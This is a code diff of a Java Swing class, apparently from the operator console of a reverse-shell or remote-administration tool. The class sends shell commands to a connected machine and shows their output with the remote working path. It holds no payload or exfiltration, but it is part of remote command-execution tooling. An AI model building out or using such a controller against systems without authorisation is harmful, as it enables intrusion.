@@ -3,34 +3,52 @@ package GUI.TableUtils.ReverseShell;
 import Information.Action;
 
 import javax.swing.*;
-import javax.swing.text.DefaultCaret;
 import java.io.IOException;
-import java.util.Arrays;
+
 
 public class CommandSender extends SwingWorker<Void, Void> {
     private final ReverseShellGUI reverseShellGUI;
-    String command;
+    private final String command;
+
+    private final String newLine;
 
     public CommandSender(ReverseShellGUI reverseShellGUI) {
         this.reverseShellGUI = reverseShellGUI;
-        command = reverseShellGUI.getTextAreaOfResult().getText();
+        command = reverseShellGUI.getFieldOfCommands().getText();
+        newLine = "\n";
 
     }
 
-    String userConsolePosition = "";
-    String resultOfCommand = "";
-    String response = "";
+    public CommandSender(ReverseShellGUI reverseShellGUI, String customCommand) {
+        this.reverseShellGUI = reverseShellGUI;
+        command = customCommand;
+        newLine = ""; // first occurrence of reverse shell
+
+    }
+
+    private String response = "";
 
     @Override
     protected Void doInBackground() throws IOException {
-        System.out.println(command);
-        response = reverseShellGUI.getStream().sendAndReadJSONX(Action.SHELL_COMMAND, command);
+        String receivedResult = reverseShellGUI.getStream().sendAndReadJSONX(Action.SHELL_COMMAND, command); // raw
+        String result = "";
+        String path;
+        String[] parts = receivedResult.split("\\|"); // separate by result of command and current path
+        if (parts.length == 0) {
+            path = reverseShellGUI.getLastPath(); // use last path saved if command was wrong
+        } else {
+            result = parts[0];
+            path = parts[1];
+            reverseShellGUI.setLastPath(path); // save current path
+        }
+
+
+        response = result + "\n" + path + ">"; // result concatenated
         return null;
     }
 
     @Override
     protected void done() {
-        String totalResult = response;
-        reverseShellGUI.getTextAreaOfResult().append(totalResult);
+        reverseShellGUI.getTextAreaOfResult().append(newLine + response);
     }
 }
